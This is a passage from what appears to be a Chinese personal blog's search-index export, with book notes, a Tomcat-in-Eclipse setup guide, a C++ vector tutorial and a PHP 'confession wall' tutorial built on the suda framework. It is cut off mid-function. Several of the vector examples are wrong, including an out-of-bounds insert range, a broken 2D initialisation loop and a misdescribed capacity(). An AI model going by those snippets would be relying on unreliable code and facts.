关键对话·如何高效能沟通作为一本语言交流性说，不得不说，他的装订风格挺舒服的。编写格式与大多一直，案例分析，指出正确的做法。ok，官方的话这次不说太多，可以随意了。真实的说这本书不和我胃口，毕竟也是看过不少的关于沟通的书，这本书提供的案例，无法引起我太大的兴趣，所以就轻微的阅读了一番。 C陷阱与缺陷·CTraps and Pitfalls该书一针见血，书名及书意，词法语法语义库函数，各个范围均涉及。讲述了不同行为产生的错误操作以及一些指正操作。ok，只可惜，目前对c的兴趣不是很大。]]></content>
  </entry>
  <entry>
    <title><![CDATA[eclipse环境下如何配置tomcat]]></title>
    <url>%2F2018%2F08%2F20%2FHow-to-configure-Tomcat-in-eclipse-environment%2F</url>
    <content type="text"><![CDATA[开了虚拟机 弄了下基本的安装 在下还是萌新 解释可能没有太详细 配置必备 JDKEclipseTomcat 安装简介jdk 一路next 直接默认的没问题eclipse 选择java_ee 选择路径 okTomcat 无太大操作空间 可以直接一路默认 Eclipse安装图解真的默认 无 Eclipse安装图解 Tomcat安装图解 配置配置TomcatWindow –&gt; Preferences –&gt; Server –&gt; Runtime Environment –&gt; Add Add你的Tomcat 选择你的版本 我的版本是v9.0 Next 选择你的安装路径 选择jdk版本 一般情况下 这个是系统默认的 这里为了一些后续方便 Workbench default JRE Add你的jdk 我的jdk版本是v9.0.1 选择你的安装路径 ok 搞定 部署新建项目File –&gt; New –&gt; Other –&gt; web –&gt;Dynamic Web Project 设置项目名 这里可以不用管 这个时候我们需要看到我们的server 部署server 将之前创建的Test项目add到 server 启动 server可以右键 也可以直接点击这个绿色启动键 设置主界面indexTest –&gt; Webcontent (之前自己设置的，这是默认的) –&gt; index.jsp 123456789101112&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"&gt;&lt;html&gt;&lt;head&gt;&lt;%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;title&gt;在此处插入标题&lt;/title&gt;&lt;/head&gt;&lt;body&gt;helloworld&lt;/body&gt;&lt;/html&gt; Ctrl+F11 ok 打开了内置的浏览器 运行成功或者手动打开浏览器http://localhost:8080/Test/ Others这里也可以修改path设置成Tomcat的目录 (了解一下) 原 改 附件Tomact 32-bit/64-bit Windows Service Installer]]></content>
      <categories>
        <category>Java Web学习</category>
      </categories>
      <tags>
        <tag>安装与配置</tag>
        <tag>Java</tag>
        <tag>Eclipse</tag>
        <tag>Java EE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[STL之Vector函数]]></title>
    <url>%2F2018%2F08%2F13%2FSTL-vector-function%2F</url>
    <content type="text"><![CDATA[感谢百度各位大佬的指点https://blog.csdn.net/yjunyu/article/details/77728410?locationNum=10&amp;fps=1 萌新表示需要百度的指点 ~!@#$%^&amp;*()_+ 介绍向量 vector 是一种对象实体, 能够容纳许多其他类型相同的元素, 因此又被称为容器。 与string相同, vector 同属于STL(Standard Template Library, 标准模板库)中的一种自定义的数据类型, 可以广义上认为是数组的增强版。 ok 简单说 动态数组 定义及使用头文件12#include&lt;vector&gt;using namespace std; //vector属于std命名域 定义变量1234567// using namespace std;using std::vector; //将std中的vector 特地指出来vector&lt;int&gt; v; //一维数组vector&lt;vector&lt;int&gt; &gt;v; //二维数组 注意有个空格方便区分//全名定义std::vector&lt;int&gt; v; 初始化一维数组带参数的构造函数初始化12//初始化一个size为0的vectorvector&lt;int&gt; v; 带参数的构造函数初始化1234//初始化size,但每个元素值为默认值vector&lt;int&gt; v(10); //初始化了10个默认值为0的元素//初始化size,并且设置初始值vector&lt;int&gt; v(10,1); //初始化了10个值为1的元素 通过数组地址初始化123int a[5] = &#123;1,2,3,4,5&#125;;//通过数组a的地址初始化，注意地址是从0到5（左闭右开区间）vector&lt;int&gt; b(a, a+5); 通过同类型的vector初始化123vector&lt;int&gt; a(5,1);//通过a初始化vector&lt;int&gt; b(a); 通过insert初始化123456789101112131415//insert初始化方式将同类型的迭代器对应的始末区间（左闭右开区间）内的值插入到vector中vector&lt;int&gt; a(6,6);vecot&lt;int&gt; b;//将a[0]~a[2]插入到b中，b.size()由0变为3b.insert(b.begin(), a.begin(), a.begin() + 3);insert也可通过数组地址区间实现插入int a[6] = &#123;6,6,6,6,6,6&#125;;vector&lt;int&gt; b;//将a的所有元素插入到b中b.insert(b.begin(), a, a+7);此外，insert还可以插入m个值为n的元素//在b开始位置处插入6个6b.insert(b.begin(), 6, 6); 通过copy函数赋值123456789vector&lt;int&gt; a(5,1);int a1[5] = &#123;2,2,2,2,2&#125;;vector&lt;int&gt; b(10);/*将a中元素全部拷贝到b开始的位置中,注意拷贝的区间为a.begin() ~ a.end()的左闭右开的区间*/copy(a.begin(), a.end(), b.begin());//拷贝区间也可以是数组地址构成的区间copy(a1, a1+5, b.begin() + 5); 二维数组 首先，需要明确的是，在计算机的世界中，根本不存在二维数组，只是使用者的一个概念罢了。其实我们所谓的二维数组也必须是一段连续的内存,由于计算机的内存是一维的，多维数组的元素应排成线性序列后存入存储器。所以采用顺序存储方法表示数组。 方法一12345678910vector&lt;vector&lt;int&gt; &gt; array; //这个m一定不能少//初始化一个m*n的二维数组for(int i=0;i&lt;m;i++) &#123; array.push_back(vector&lt;int&gt;());&#125;for (int i=0;i&lt;array.size();i++)&#123; for (int j=0;j&lt;n;j++)&#123; array[i].push_back(j); &#125; &#125; 方法二12345vector&lt;vector&lt;int&gt; &gt; array(m); //这个m一定不能少//初始化一个m*n的二维数组for(int i=0;i&lt;n;i++) &#123; array[i].resize(0);&#125; 方法三1vector&lt;vector&lt;int&gt; &gt; array(m ,vector&lt;int&gt;(n)); //m*n的二维vector vector 容器与数组相比其优点在于它能够根据需要随时自动调整自身的大小以便容下所要放入的元素。此外, vector 也提供了许多的方法来对自身进行操作。 Vector常用函数表 函数 描述 v.assign(begin,end) v.assign(n,elem) 将[begin; end)区间中的数据赋值给v 将n个elem的拷贝赋值给v at(index) 传回索引index所指的数据 如果index越界 抛出out_of_range back() 传回最后一个数据 不检查这个数据是否存在 begin() 传回迭代器中的第一个数据地址 数组的首元素地址 capacity() 返回容器中数据个数 clear() 移除容器中所有数据 empty() 判断容器是否为空 为空时返回真 否则返回假 end() 指向迭代器中末端元素的下一个 指向一个不存在元素 erase(pos) 删除pos位置的数据 传回下一个数据的位置 erase(begin,end) 删除[begin,end)区间的数据 传回下一个数据的位置 front() 传回第一个数据 get_allocator 使用构造函数返回一个拷贝 insert(pos,elem) 在pos位置插入一个elem拷贝 传回新数据位置 insert(pos,n,elem) 在pos位置插入n个elem数据。无返回值 insert(pos,begin,end) 在pos位置插入在[begin,end)区间的数据 无返回值 max_size() 返回容器中最大数据的数量 pop_back() 删除最后一个数据 push_back(elem) 在尾部加入一个数据 rbegin() 传回一个逆向队列的第一个数据 rend() 传回一个逆向队列的最后一个数据的下一个位置 resize(num) 重新指定队列的长度 reserve() 保留适当的容量 size() 返回容器中实际数据的个数 a.swap(b) swap(a,b) 将a和b元素互换 operator[] 返回容器中指定位置的一个引用]]></content>
      <categories>
        <category>C++学习</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>STL</tag>
        <tag>Vector</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次suda框架之表白墙]]></title>
    <url>%2F2018%2F08%2F12%2FSuda-confession-wall%2F</url>
    <content type="text"><![CDATA[表白墙设计…大概需要这些功能吧 发布表白 列出表白 表白管理 增删改查 评论功能 附件功能 所需模块 support user content-parser 安装模块 预览一下 app/mainifast.yml 原 app/mainifast.json 为你的app改个好听的name 配置好启动的模块 使用.yml文件时需要将下载的vendor 添加至app中 config.json 可以考虑修改一下数据库 modules 把你的share和import弄好 router.json 基本配置&amp;&amp;发布表白tableConfessionTable.php12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?phpnamespace dxkite\confession\wall\table;/** * 表对象，处理表白 */class ConfessionTable extends \suda\archive\Table&#123; const CONTENT_TYPE = 'markdown'; const STATUS_DELETE = 0; // 删除状态 const STATUS_NORMAL = 1; // 正常状态 const STATUS_DRAFT = 2; // 草稿状态 const ANONYMOUS = 1; public function __construct() &#123; parent::__construct('confession'); &#125; public function onBuildCreator($table) &#123; return $table-&gt;fields( $table-&gt;field('id', 'bigint', 20)-&gt;primary()-&gt;unsigned()-&gt;auto(), $table-&gt;field('user', 'bigint', 20)-&gt;key()-&gt;comment('发布者'), $table-&gt;field('anonymous', 'tinyint', 1)-&gt;default(self::ANONYMOUS)-&gt;comment('匿名发布'), $table-&gt;field('title', 'varchar', 255)-&gt;comment('标题'), $table-&gt;field('content', 'text')-&gt;comment("文字内容"), $table-&gt;field('time', 'int', 11)-&gt;key()-&gt;unsigned()-&gt;comment('发表时间'), $table-&gt;field('ip', 'varchar', 32)-&gt;comment('发布IP'), $table-&gt;field('status', 'int', 11)-&gt;key()-&gt;unsigned()-&gt;default(self::STATUS_DRAFT)-&gt;comment('状态') ); &#125; /** * 使用Markdown 对内容进行默认编码 * * @param string $content * @return void */ protected function _inputContentField(string $content) &#123; return content_pack($content, self::CONTENT_TYPE); &#125; /** * 将内容解码成HTML格式 * * @param string $content * @return void */ protected function _outputContentField(string $content) &#123; // 解码成对象 if ($object = content_unpack($content)) &#123; return $object; &#125; // 未设置解码则按text编码 return content_create($content, 'text'); &#125;&#125; controllerConfessionController.php123456789101112131415161718192021222324252627282930&lt;?phpnamespace dxkite\confession\wall\controller;use dxkite\confession\wall\table\ConfessionTable;/** * 处理表白 */class ConfessionController&#123; protected $table; public function __construct() &#123; $this-&gt;table = new ConfessionTable; &#125; public function add(string $title, string $content, bool $anonymous=true): int &#123; return $this-&gt;table-&gt;insert([ 'user' =&gt; get_user_id(), 'title' =&gt; $title , 'content' =&gt; $content, 'anonymous' =&gt; $anonymous ? 1 :0, 'time' =&gt; time(), 'ip' =&gt; request()-&gt;ip(), 'status' =&gt; ConfessionTable::STATUS_NORMAL, ]); &#125;&#125; providerConfessionProvider.php12345678910111213141516171819202122&lt;?phpnamespace dxkite\confession\wall\provider;use dxkite\confession\wall\controller\ConfessionController;/** * 处理表白 */class ConfessionProvider&#123; protected $controller; public function __construct() &#123; $this-&gt;controller = new ConfessionController; &#125; public function add(string $title, string $content, bool $anonymous=true): int &#123; return $this-&gt;controller-&gt;add($title,$content,$anonymous); &#125;&#125; srcIndexResponse.php123456789101112131415&lt;?phpnamespace dxkite\confession\wall\response;use dxkite\support\visitor\response\Response;use dxkite\support\visitor\Context;class IndexResponse extends Response&#123; public function onVisit(Context $context) &#123; $view = $this-&gt;view('index'); $view-&gt;render(); &#125;&#125; PostResponse.php123456789101112131415161718192021222324&lt;?phpnamespace dxkite\confession\wall\response;use dxkite\support\visitor\response\VisitorResponse;use dxkite\support\visitor\Context;use dxkite\confession\wall\controller\ConfessionController;class PostResponse extends VisitorResponse&#123; public function onUserVisit(Context $context) &#123; $view = $this-&gt;view('post'); if (request()-&gt;hasPost()) &#123; $controller = new ConfessionController; $title = request()-&gt;post('title'); $context = request()-&gt;post('content'); $anonymous = request()-&gt;post('anonymous',false) == true ?true:false; if ($title &amp;&amp; $context) &#123; $id = $controller-&gt;add($title,$context,$anonymous); &#125; &#125; $view-&gt;render(); &#125;&#125; templateindex.tpl.html12345@extend ('layout')&lt;!-- 插入内容 --&gt;@startInsert('confession-content')&lt;h3&gt;这里是内容&lt;/h3&gt;@endInsert header.tpl.html12345678910&lt;nav class="navbar navbar-dark sticky-top bg-dark navbar-expand-lg flex-md-nowrap p-0"&gt; &lt;a class="navbar-brand col-sm-3 col-md-2 mr-0" href="#"&gt;&#123;&#123; $:website_name('涉外学院 - 表白墙') &#125;&#125;&lt;/a&gt; &lt;ul class="navbar-nav mr-auto"&gt; &lt;/ul&gt; &lt;ul class="navbar-nav px-3"&gt; &lt;li class="nav-item text-nowrap"&gt; &lt;a class="nav-link @b($this-&gt;isMe('index'),'active')" href="@u('index')"&gt;首页&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt;&lt;/nav&gt; layout.tpl.html1234567891011121314151617@extend ('support:bootstrap') @startInsert('bs-head')&lt;!-- css --&gt;@endInsert @startInsert('bs-content') @include ('header')&lt;div class="container"&gt; @if ($?:alert) &lt;div class="alert alert-&#123;&#123; $:alert.type &#125;&#125; m-2" role="alert"&gt; &#123;&#123; $:alert.text &#125;&#125; &lt;button type="button" class="close" data-dismiss="alert" aria-label="Close"&gt; &lt;span aria-hidden="true"&gt;&amp;times;&lt;/span&gt; &lt;/button&gt; &lt;/div&gt; @endif @insert('confession-content')&lt;/div&gt;@endInsert post.tpl.html12345678910111213141516171819202122232425262728@extend ('layout') @startInsert('confession-content')&lt;form action="@u" method="post" class="my-2"&gt; &lt;div class="form-group row"&gt; &lt;label for="title" class="col-sm-2 col-form-label"&gt;&#123;= 标题 &#125;&lt;/label&gt; &lt;div class="col-sm-10"&gt; &lt;input type="text" class="form-control" id="title" name="title"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="form-group row"&gt; &lt;label for="description" class="col-sm-2 col-form-label"&gt;&#123;= 具体内容 &#125;&lt;/label&gt; &lt;div class="col-sm-10"&gt; &lt;textarea class="form-control" name="content" id="description" rows="3"&gt; &lt;/textarea&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="form-group row"&gt; &lt;div class="col-2"&gt; &lt;button type="submit" class="btn btn-info mb-2" name="action" value="publish"&gt;&#123;= 发布 &#125;&lt;/button&gt; &lt;/div&gt; &lt;div class="checkbox col"&gt; &lt;label&gt; &lt;input id="anonymous" name="anonymous" type="checkbox" value="true"&gt; &#123;= 匿名发表 &#125; &lt;/label&gt; &lt;/div&gt; &lt;/div&gt;&lt;/form&gt;@endInsert configapimapper.yml 12v1.0: confession-wall: dxkite.confession.wall.provider.ConfessionProvider 关于发布匿名表白及使用线路2进行匿名表白这里就略了，可直接会长的文章https://dxkite.cn/2018/08/23/suda-confession-wall-simple-action/ 列出表白tableConfessionController.php12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpnamespace dxkite\confession\wall\controller;use dxkite\confession\wall\table\ConfessionTable;use dxkite\support\view\TablePager; // 引入分页函数类/** * 处理表白 */class ConfessionController&#123; protected $table; public function __construct() &#123; $this-&gt;table = new ConfessionTable; &#125; /** * 添加表白帖 * * @param string $title * @param string $content * @param boolean $anonymous * @return integer */ public function add(string $title, string $content, bool $anonymous=true): int &#123; return $this-&gt;table-&gt;insert([ 'user' =&gt; get_user_id(), 'title' =&gt; $title , 'content' =&gt; $content, 'anonymous' =&gt; $anonymous ? 1 :0, 'time' =&gt; time(), 'ip' =&gt; request()-&gt;ip(), 'status' =&gt; ConfessionTable::STATUS_NORMAL, ]); &#125; public function list(?int $page, int $row = 10):?array &#123; // 列出表元素，当状态为：ConfessionTable::STATUS_NORMAL 的时候 return TablePager::listWhere($this-&gt;table, ['status' =&gt; ConfessionTable::STATUS_NORMAL], [], $page, $row); &#125;&#125; providerConfessionProvider.php添加列出函数 1.方案一12345678910111213141516171819202122public function list(?int $page, int $row = 10):?array&#123; $pageData = $this-&gt;controller-&gt;list($page, $row); $pageRows = $pageData['rows']; // 获取到数据字段 foreach ($pageRows as $index =&gt; $pageRow ) &#123; // 表示匿名状态 if ($pageRow['anonymous'] == 1) &#123; // 清理user的信息 $pageRow['user'] = 0; &#125;else&#123; // 根据ID获取信息 $pageRow['user'] = get_user_public_info($pageRow['user']); &#125; // 去除IP信息 unset($pageRow['ip']); // 替换原来的列 $pageRows[$index] = $pageRow; &#125; // 放回原来的字段 $pageData['rows'] = $pageRows; return $pageData;&#125; 2.方案二1234567891011121314151617181920212223242526272829303132public function list(?int $page, int $row = 10):?array&#123; $pageData = $this-&gt;controller-&gt;list($page, $row); $pageRows = $pageData['rows']; // 获取到数据字段 // 检测到需要处理的用户ID $userIdMap = []; foreach ($pageRows as $index =&gt; $pageRow) &#123; // 表示匿名状态 if ($pageRow['anonymous'] == 1) &#123; // 清理user的信息 $pageRow['user'] = 0; &#125; else &#123; // 记录ID信息 // ID =&gt; 索引 $userIdMap[$pageRow['user']]=$index; &#125; // 去除IP信息 unset($pageRow['ip']); // 替换原来的列 $pageRows[$index] = $pageRow; &#125; // 获取所有用户信息 $userInfos = get_user_public_info_array(array_keys($userIdMap)); // 返回到数据列 foreach ($userInfos as $id =&gt; $data) &#123; // $userIdMap[$id] == index $pageRows[$userIdMap[$id]]['user']=$data; &#125; // 放回原来的字段 $pageData['rows'] = $pageRows; return $pageData;&#125; 表白管理configpermissions.yml 1234567confession-wall: name: 表白墙权限管理 childs: view: 查看表白列表 status: 编辑列表状态 edit: 编辑表白 delete: 删除表白 apimapper.yml 123v1.0: confession-wall: dxkite.confession.wall.provider.ConfessionProvider confession-wall-setting: dxkite.confession.wall.provider.ConfessionSettingProvider providerConfessionSettingProvider.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpnamespace dxkite\confession\wall\provider;use dxkite\confession\wall\controller\ConfessionController;/** * 管理表白 */class ConfessionSettingProvider&#123; protected $controller; public function __construct() &#123; $this-&gt;controller = new ConfessionController; &#125; /** * 列出表白墙列表 * * @acl confession-wall.view * @param integer|null $page * @param integer $row * @return array|null */ public function list(?int $page, int $row = 10):?array &#123; $pageData = $this-&gt;controller-&gt;list($page, $row); $pageRows = $pageData['rows']; // 获取到数据字段 // 检测到需要处理的用户ID $userIdMap = []; foreach ($pageRows as $index =&gt; $pageRow) &#123; $userIdMap[$pageRow['user']][]=$index; &#125; // 获取所有用户信息 $userInfos = get_user_public_info_array(array_keys($userIdMap)); // 返回到数据列 foreach ($userInfos as $id =&gt; $data) &#123; foreach ($userIdMap[$id] as $index) &#123; $pageRows[$index]['user']=$data; &#125; &#125; // 放回原来的字段 $pageData['rows'] = $pageRows; return $pageData; &#125;&#125; 可能你会缺少这个use dxkite\confession\wall\table\ConfessionTable; 有关添加权限角色与列出等操作，请移步会长文章 https://dxkite.cn/2018/08/25/suda-confession-wall-setting/ 编辑删除providerConfessionSettingProvider.php添加编辑函数 12345678910111213141516171819/** * 编辑内容 * * @acl confession-wall.edit * @param integer $id * @param array $value * @return boolean */public function edit(int $id, array $value):bool&#123; $table = new ConfessionTable; if (array_key_exists('title', $value)) &#123; $sets['title']=$value['title']; &#125; if (array_key_exists('content', $value)) &#123; $sets['content']=$value['content']; &#125; return $table-&gt;updateByPrimaryKey($id,$sets) &gt; 0;&#125; 添加编辑函数 12345678910/** * 删除内容 * @acl confession-wall.delete * @param integer $id * @return boolean */public function delete(int $id):bool &#123; $table = new ConfessionTable; return $table-&gt;updateByPrimaryKey($id,['status' =&gt; ConfessionTable::STATUS_DELETE ]) &gt; 0;&#125; 操作部分省略，移步文章https://dxkite.cn/2018/08/26/suda-confession-wall-setting-edit-delete/ 评论功能 预览一下 module.json 注意写一下 app/mainifast.yml 启动相应模块 support &amp;&amp; 评论 tableCommentTable.php12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?phpnamespace dxkite\comments\table;/** * 评论 */class CommentTable extends \suda\archive\Table&#123; const CONTENT_TYPE = 'markdown'; const STATUS_DELETE = 0; // 删除状态 const STATUS_NORMAL = 1; // 正常状态 const STATUS_DRAFT = 2; // 草稿状态 public function __construct(string $subfix=null) &#123; parent::__construct('comment'. self::parseSubfix($subfix)); &#125; protected function parseSubfix(?string $subfix) &#123; if (!is_null($subfix)) &#123; $subfix = '_'.$subfix; return preg_replace('/[^\w]+/','_',$subfix); &#125; return ''; &#125; public function onBuildCreator($table) &#123; return $table-&gt;fields( $table-&gt;field('id', 'bigint', 20)-&gt;primary()-&gt;unsigned()-&gt;auto(), $table-&gt;field('user', 'bigint', 20)-&gt;key()-&gt;comment('发布者'), $table-&gt;field('target', 'bigint', 20)-&gt;key()-&gt;comment('目标'), $table-&gt;field('content', 'text')-&gt;comment("文字内容"), $table-&gt;field('time', 'int', 11)-&gt;key()-&gt;unsigned()-&gt;comment('发表时间'), $table-&gt;field('ip', 'varchar', 32)-&gt;comment('发布IP'), $table-&gt;field('status', 'int', 11)-&gt;key()-&gt;unsigned()-&gt;default(self::STATUS_DRAFT)-&gt;comment('状态') ); &#125; /** * 使用Markdown 对内容进行默认编码 * * @param string $content * @return void */ protected function _inputContentField(string $content) &#123; return content_pack($content, self::CONTENT_TYPE); &#125; /** * 将内容解码成HTML格式 * * @param string $content * @return void */ protected function _outputContentField(string $content) &#123; // 解码成对象 if ($object = content_unpack($content)) &#123; return $object; &#125; // 未设置解码则按text编码 return content_create($content, 'text'); &#125;&#125; SubCommentTable.php12345678910111213141516171819202122&lt;?phpnamespace dxkite\comments\table;/** * 子评论 */class SubCommentTable extends CommentTable&#123; public function __construct(string $subfix =null) &#123; parent::__construct('sub' .self::parseSubfix($subfix)); &#125; public function onBuildCreator($table) &#123; $table = parent::onBuildCreator($table); return $table-&gt;fields( $table-&gt;field('parent', 'bigint', 20)-&gt;key()-&gt;comment('父评论'), $table-&gt;field('reply', 'bigint', 20)-&gt;key()-&gt;comment('回复') ); &#125;&#125; controllerCommentController.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137&lt;?phpnamespace dxkite\comments\controller;use dxkite\comments\table\CommentTable;use dxkite\comments\table\SubCommentTable;use dxkite\support\view\TablePager;/** * 评论 */class CommentController&#123; protected $commentTable; protected $subCommentTable; public function __construct(string $name = null) &#123; $this-&gt;commentTable= new CommentTable($name); $this-&gt;subCommentTable= new SubCommentTable($name); &#125; /** * 评论 * * @param integer $target * @param string $content * @return integer */ public function add(int $target, string $content):int &#123; $user = get_user_id(); return $this-&gt;commentTable-&gt;insert([ 'user' =&gt; $user, 'target' =&gt; $target, 'content' =&gt; $content, 'time' =&gt; time(), 'ip' =&gt; request()-&gt;ip(), 'status' =&gt; CommentTable::STATUS_NORMAL, ]); &#125; /** * 评论评论 * * @param integer $comment * @param string $content * @return integer */ public function comment(int $comment, string $content):int &#123; $user = get_user_id(); if ($parent = $this-&gt;commentTable-&gt;getByPrimaryKey($comment)) &#123; return $this-&gt;subCommentTable-&gt;insert([ 'user' =&gt; $user, 'target' =&gt; $parent['target'], 'content' =&gt; $content, 'parent'=&gt; $comment, 'time' =&gt; time(), 'ip' =&gt; request()-&gt;ip(), 'status' =&gt; CommentTable::STATUS_NORMAL, ]); &#125; return 0; &#125; /** * 删除评论 * * @param integer $comment * @param boolean $sub * @return boolean */ public function delete(int $comment, bool $sub = false):bool &#123; $user = get_user_id(); $table = $sub ? $this-&gt;subCommentTable : $this-&gt;commentTable; if ($that = $table-&gt;getByPrimaryKey($comment)) &#123; // 只有自己能够删除 if ($that['user'] == $user) &#123; return $table-&gt;updateByPrimaryKey($that['id'], [ 'status' =&gt; CommentTable::STATUS_DELETE, ]) &gt; 0; &#125; &#125; &#125; /** * 回复子评论 * * @param integer $subcommet * @param string $content * @return integer */ public function reply(int $subcommet, string $content):int &#123; $user = get_user_id(); if ($parent = $this-&gt;subCommentTable-&gt;getByPrimaryKey($subcommet)) &#123; return $this-&gt;subCommentTable-&gt;insert([ 'user' =&gt; $user, 'target' =&gt; $parent['target'], 'reply' =&gt; $parent['user'], 'content' =&gt; $content, 'parent'=&gt; $parent['parent'], 'time' =&gt; time(), 'ip' =&gt; request()-&gt;ip(), 'status' =&gt; CommentTable::STATUS_NORMAL, ]); &#125; return 0; &#125; /** * 获取目标评论 * * @param integer $target * @param integer|null $page * @param integer $row * @return array|null */ public function getComment(int $target, ?int $page, int $row = 10):?array &#123; return TablePager::listWhere($this-&gt;commentTable, ['status' =&gt; CommentTable::STATUS_NORMAL], [], $page, $row); &#125; /** * 获取评论的评论 * * @param integer $comment * @param integer|null $page * @param integer $row * @return array|null */ public function getSubComment(int $comment, ?int $page, int $row = 10):?array &#123; return TablePager::listWhere($this-&gt;subCommentTable, ['status' =&gt; CommentTable::STATUS_NORMAL], [], $page, $row); &#125;&#125; providerCommentProvider.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120&lt;?phpnamespace dxkite\comments\provider;use dxkite\comments\controller\CommentController;/** * 评论 */class CommentProvider&#123; protected $name = ''; protected $commentTable; protected $subCommentTable; public function __construct(string $name = null) &#123; $this-&gt;controller = new CommentController($name); &#125; /** * 评论 * * @param integer $target * @param string $content * @return integer */ public function add(int $target, string $content):int &#123; return $this-&gt;controller-&gt;add($target, $content); &#125; /** * 评论评论 * * @param integer $comment * @param string $content * @return integer */ public function comment(int $comment, string $content):int &#123; return $this-&gt;controller-&gt;comment($comment, $content); &#125; /** * 回复子评论 * * @param integer $subcommet * @param string $content * @return integer */ public function reply(int $subcommet, string $content):int &#123; return $this-&gt;controller-&gt;reply($subcommet, $content); &#125; /** * 获取目标评论 * * @param integer $target * @param integer|null $page * @param integer $row * @return array|null */ public function getComment(int $target, ?int $page=null, int $row=10):?array &#123; $comments = $this-&gt;controller-&gt;getComment($target, $page, $row); $rows = $comments['rows']; $ids = []; foreach ($rows as $index =&gt; $row) &#123; $ids[] = $row['user']; unset($row['ip']); $rows[$index] = $row; &#125; $userInfos = get_user_public_info_array($ids); foreach ($rows as $index =&gt; $row) &#123; $rows[$index]['user'] = $userInfos[$row['user']] ?? $row['user']; &#125; $comments['rows'] = $rows; return $comments; &#125; /** * 获取评论的评论 * * @param integer $comment * @param integer|null $page * @param integer $row * @return array|null */ public function getSubComment(int $comment, ?int $page=null, int $row=10):?array &#123; $comments = $this-&gt;controller-&gt;getSubComment($comment, $page, $row); $rows = $comments['rows']; $ids = []; foreach ($rows as $index =&gt; $row) &#123; $ids[] = $row['user']; unset($row['ip']); $rows[$index] = $row; &#125; $userInfos = get_user_public_info_array($ids); foreach ($rows as $index =&gt; $row) &#123; $rows[$index]['user'] = $userInfos[$row['user']] ?? $row['user']; $rows[$index]['reply'] = $userInfos[$row['reply']] ?? $row['reply']; &#125; $comments['rows'] = $rows; return $comments; &#125; /** * 删除特定评论 * * @param integer $comment * @param boolean $sub * @return boolean */ public function delete(int $comment, bool $sub = false):bool &#123; return $this-&gt;controller-&gt;delete($comment, $sub); &#125;&#125; config (confession.wall)api1234v1.0: confession-wall: dxkite.confession.wall.provider.ConfessionProvider confession-wall-comment: dxkite.comments.provider.CommentProvider(confession-wall) confession-wall-setting: dxkite.confession.wall.provider.ConfessionSettingProvider 不逼逼了，直接给链接 https://dxkite.cn/2018/08/27/suda-comment/ 附件功能 预览一下 module.json 注意写一下 app/mainifast.yml 启动相应模块 tableCommentTable.php12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpnamespace dxkite\attachments\table;use suda\tool\Command;use suda\archive\Table;/** * 附件表 */class AttachmentTable extends Table&#123; protected $target; public function __construct(string $target=null) &#123; // 实例化一个字符串到类 $this-&gt;target = Command::newClassInstance($target); $perfix = self::parsePerfix($this-&gt;target-&gt;getTableName()); parent::__construct($perfix.'attachments'); &#125; public function getTargetTable():Table &#123; return $this-&gt;target; &#125; protected function parsePerfix(?string $fix) &#123; if (!is_null($fix)) &#123; $fix = $fix.'_'; return ltrim(preg_replace('/[^\w]+/', '_', $fix), '_'); &#125; return ''; &#125; public function onBuildCreator($table) &#123; return $table-&gt;fields( $table-&gt;field('id', 'bigint', 20)-&gt;primary()-&gt;unsigned()-&gt;auto(), $table-&gt;field('target', 'bigint', 20)-&gt;unsigned()-&gt;comment('目标内容'), $table-&gt;field('attachment', 'bigint', 20)-&gt;unsigned()-&gt;comment('附件ID'), $table-&gt;field('hash', 'varchar', 32)-&gt;comment('附件Hash'), $table-&gt;field('time', 'int', 11)-&gt;key()-&gt;unsigned()-&gt;comment('添加时间') ); &#125;&#125; controllerAttachmentController.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;?phpnamespace dxkite\attachments\controller;use suda\core\Query;use suda\exception\SQLException;use dxkite\support\file\File;use dxkite\support\file\Media;use dxkite\attachments\table\AttachmentTable;/** * 附件控制器 */class AttachmentController&#123; protected $table; protected $target; protected $userField; public function __construct(string $target, string $userField = 'user') &#123; $this-&gt;table=new AttachmentTable($target); $this-&gt;target = $this-&gt;table-&gt;getTargetTable(); $this-&gt;userField = $userField; &#125; public function add(int $target, File $attachment):bool &#123; if ($targetData = $this-&gt;target-&gt;getByPrimaryKey($target)) &#123; if ($targetData[$this-&gt;userField] == get_user_id()) &#123; if ($this-&gt;table-&gt;select('*', ['hash'=&gt;$attachment-&gt;getMd5(),'target'=&gt;$target])-&gt;fetch()) &#123; return true; &#125; else &#123; $file = Media::save($attachment); if (!$file) &#123; return false; &#125; return $this-&gt;table-&gt;insert([ 'time'=&gt;time(), 'target'=&gt; $target, 'attachment' =&gt; $file-&gt;getId(), 'hash' =&gt; $attachment-&gt;getMd5(), ]) &gt; 0; &#125; &#125; else &#123; return false; &#125; &#125; &#125; public function getAttachments(int $target):?array &#123; if ($images = $this-&gt;table-&gt;select('*', ['target'=&gt;$target])-&gt;fetchAll()) &#123; return $images; &#125; return null; &#125; public function delete(int $attachmentId):bool &#123; if ($fetchData = $this-&gt;table-&gt;select(['attachment','target'], ['id'=&gt;$attachmentId])-&gt;fetch()) &#123; list('target'=&gt;$target,'attachment' =&gt; $attachment) = $fetchData; if ($targetData = $this-&gt;target-&gt;getByPrimaryKey($target)) &#123; if ($targetData[$this-&gt;userField] == get_user_id()) &#123; Media::delete($attachment); return $this-&gt;table-&gt;delete(['id'=&gt;$attachmentId]) &gt; 0; &#125; else &#123; return false; &#125; 